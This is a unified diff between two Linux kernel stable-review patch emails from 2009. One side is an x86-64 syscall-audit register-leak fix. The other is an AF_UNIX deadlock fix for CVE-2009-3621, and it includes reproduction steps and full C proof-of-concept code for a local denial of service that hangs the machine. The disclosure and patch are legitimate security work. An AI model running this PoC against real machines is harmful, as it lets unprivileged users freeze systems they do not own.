@@ -1,27 +1,29 @@
-Return-Path: <linux-kernel-owner+w=401wt.eu-S1760066AbZKFWJW@vger.kernel.org>
+Return-Path: <linux-kernel-owner+w=401wt.eu-S1760076AbZKFWJY@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1760066AbZKFWJW (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 6 Nov 2009 17:09:22 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1759938AbZKFWFx
+	id S1760076AbZKFWJY (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 6 Nov 2009 17:09:24 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1759938AbZKFWJW
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Fri, 6 Nov 2009 17:05:53 -0500
-Received: from kroah.org ([198.145.64.141]:39764 "EHLO coco.kroah.org"
+	Fri, 6 Nov 2009 17:09:22 -0500
+Received: from kroah.org ([198.145.64.141]:39768 "EHLO coco.kroah.org"
 	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1759929AbZKFWFw (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 6 Nov 2009 17:05:52 -0500
+	id S1759933AbZKFWFx (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 6 Nov 2009 17:05:53 -0500
 X-Mailbox-Line: From gregkh@mini.kroah.org Fri Nov  6 13:59:52 2009
-Message-Id: <20091106215951.964924845@mini.kroah.org>
+Message-Id: <20091106215952.100901703@mini.kroah.org>
 User-Agent: quilt/0.48-1
-Date: Fri, 06 Nov 2009 13:56:18 -0800
+Date: Fri, 06 Nov 2009 13:56:19 -0800
 From: Greg KH <gregkh@suse.de>
 To: linux-kernel@vger.kernel.org, stable@kernel.org
 Cc: stable-review@kernel.org, torvalds@linux-foundation.org,
        akpm@linux-foundation.org, alan@lxorguk.ukuu.org.uk,
-       Jan Beulich <jbeulich@novell.com>, Roland McGrath <roland@redhat.com>,
-       Ingo Molnar <mingo@elte.hu>
-Subject: [15/30] x86-64: Fix register leak in 32-bit syscall audting
+       Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>,
+       Masanori Yoshida <masanori.yoshida.tv@hitachi.com>,
+       Chuck Ebbert <cebbert@redhat.com>,
+       "David S. Miller" <davem@davemloft.net>
+Subject: [16/30] AF_UNIX: Fix deadlock on connecting to shutdown socket (CVE-2009-3621)
 References: <20091106215603.413650799@mini.kroah.org>
-Content-Disposition: inline; filename=x86-64-fix-register-leak-in-32-bit-syscall-audting.patch
+Content-Disposition: inline; filename=af_unix-fix-deadlock-on-connecting-to-shutdown-socket-cve-2009-3621.patch
 In-Reply-To: <20091106220156.GA13813@kroah.com>
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
@@ -30,54 +32,89 @@ X-Mailing-List: linux-kernel@vger.kernel.org
 2.6.29-stable review patch.  If anyone has any objections, please let us know.
 
 ------------------
-From: Jan Beulich <JBeulich@novell.com>
+From: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
 
-commit 81766741fe1eee3884219e8daaf03f466f2ed52f upstream.
+commit 77238f2b942b38ab4e7f3aced44084493e4a8675 upstream.
 
-Restoring %ebp after the call to audit_syscall_exit() is not
-only unnecessary (because the register didn't get clobbered),
-but in the sysenter case wasn't even doing the right thing: It
-loaded %ebp from a location below the top of stack (RBP <
-ARGOFFSET), i.e. arbitrary kernel data got passed back to user
-mode in the register.
+I found a deadlock bug in UNIX domain socket, which makes able to DoS
+attack against the local machine by non-root users.
 
-Signed-off-by: Jan Beulich <jbeulich@novell.com>
-Acked-by: Roland McGrath <roland@redhat.com>
-LKML-Reference: <4AE5CC4D020000780001BD13@vpn.id2.novell.com>
-Signed-off-by: Ingo Molnar <mingo@elte.hu>
-Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
+How to reproduce:
+1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
+    namespace(*), and shutdown(2) it.
+ 2. Repeat connect(2)ing to the listening socket from the other sockets
+    until the connection backlog is full-filled.
+ 3. connect(2) takes the CPU forever. If every core is taken, the
+    system hangs.
+
+PoC code: (Run as many times as cores on SMP machines.)
+
+int main(void)
+{
+	int ret;
+	int csd;
+	int lsd;
+	struct sockaddr_un sun;
+
+	/* make an abstruct name address (*) */
+	memset(&sun, 0, sizeof(sun));
+	sun.sun_family = PF_UNIX;
+	sprintf(&sun.sun_path[1], "%d", getpid());
+
+	/* create the listening socket and shutdown */
+	lsd = socket(AF_UNIX, SOCK_STREAM, 0);
+	bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
+	listen(lsd, 1);
+	shutdown(lsd, SHUT_RDWR);
+
+	/* connect loop */
+	alarm(15); /* forcely exit the loop after 15 sec */
+	for (;;) {
+		csd = socket(AF_UNIX, SOCK_STREAM, 0);
+		ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
+		if (-1 == ret) {
+			perror("connect()");
+			break;
+		}
+		puts("Connection OK");
+	}
+	return 0;
+}
+
+(*) Make sun_path[0] = 0 to use the abstruct namespace.
+    If a file-based socket is used, the system doesn't deadlock because
+    of context switches in the file system layer.
+
+Why this happens:
+ Error checks between unix_socket_connect() and unix_wait_for_peer() are
+ inconsistent. The former calls the latter to wait until the backlog is
+ processed. Despite the latter returns without doing anything when the
+ socket is shutdown, the former doesn't check the shutdown state and
+ just retries calling the latter forever.
+
+Patch:
+ The patch below adds shutdown check into unix_socket_connect(), so
+ connect(2) to the shutdown socket will return -ECONREFUSED.
+
+Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
+Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
+Cc: Chuck Ebbert <cebbert@redhat.com>
+Signed-off-by: David S. Miller <davem@davemloft.net>
 
 ---
- arch/x86/ia32/ia32entry.S |    5 ++---
- 1 file changed, 2 insertions(+), 3 deletions(-)
+ net/unix/af_unix.c |    2 ++
+ 1 file changed, 2 insertions(+)
 
---- a/arch/x86/ia32/ia32entry.S
-+++ b/arch/x86/ia32/ia32entry.S
-@@ -204,7 +204,7 @@ sysexit_from_sys_call:
- 	movl RDI-ARGOFFSET(%rsp),%r8d	/* reload 5th syscall arg */
- 	.endm
+--- a/net/unix/af_unix.c
++++ b/net/unix/af_unix.c
+@@ -1061,6 +1061,8 @@ restart:
+ 	err = -ECONNREFUSED;
+ 	if (other->sk_state != TCP_LISTEN)
+ 		goto out_unlock;
++	if (other->sk_shutdown & RCV_SHUTDOWN)
++		goto out_unlock;
  
--	.macro auditsys_exit exit,ebpsave=RBP
-+	.macro auditsys_exit exit
- 	testl $(_TIF_ALLWORK_MASK & ~_TIF_SYSCALL_AUDIT),TI_flags(%r10)
- 	jnz ia32_ret_from_sys_call
- 	TRACE_IRQS_ON
-@@ -217,7 +217,6 @@ sysexit_from_sys_call:
- 	call audit_syscall_exit
- 	GET_THREAD_INFO(%r10)
- 	movl RAX-ARGOFFSET(%rsp),%eax	/* reload syscall return value */
--	movl \ebpsave-ARGOFFSET(%rsp),%ebp /* reload user register value */
- 	movl $(_TIF_ALLWORK_MASK & ~_TIF_SYSCALL_AUDIT),%edi
- 	cli
- 	TRACE_IRQS_OFF
-@@ -351,7 +350,7 @@ cstar_auditsys:
- 	jmp cstar_dispatch
- 
- sysretl_audit:
--	auditsys_exit sysretl_from_sys_call, RCX /* user %ebp in RCX slot */
-+	auditsys_exit sysretl_from_sys_call
- #endif
- 
- cstar_tracesys:
+ 	if (unix_recvq_full(other)) {
+ 		err = -EAGAIN;
 
 
